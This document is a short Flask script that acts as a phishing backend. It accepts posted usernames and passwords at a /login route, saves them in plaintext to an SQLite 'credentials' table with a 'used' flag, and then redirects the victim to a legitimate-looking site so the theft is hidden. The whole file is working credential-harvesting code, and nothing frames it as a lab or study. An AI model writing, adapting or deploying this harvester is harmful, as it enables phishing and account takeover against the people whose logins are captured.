from flask import Flask, request, redirect
import sqlite3
import os
import time

app = Flask(__name__)
DB_PATH = '/app/database/credentials.db'

def init_db():
    if not os.path.exists(DB_PATH):
        conn = sqlite3.connect(DB_PATH)
        conn.execute('''CREATE TABLE credentials
                     (id INTEGER PRIMARY KEY,
                      username TEXT,
                      password TEXT,
                      timestamp TEXT,
                      used INTEGER DEFAULT 0)''')
        conn.commit()
        conn.close()

def log_credentials(username, password):
    conn = sqlite3.connect(DB_PATH)
    timestamp = time.strftime('%Y-%m-%d %H:%M:%S')
    conn.execute("INSERT INTO credentials (username, password, timestamp) VALUES (?, ?, ?)",
                 (username, password, timestamp))
    conn.commit()
    conn.close()

@app.route('/login', methods=['POST'])
def login():
    username = request.form.get('username', '')
    password = request.form.get('password', '')
    
    if username and password:
        log_credentials(username, password)
        
    return redirect('https://legitimate-site.com')

if __name__ == '__main__':
    init_db()
    app.run(host='0.0.0.0', port=8000)
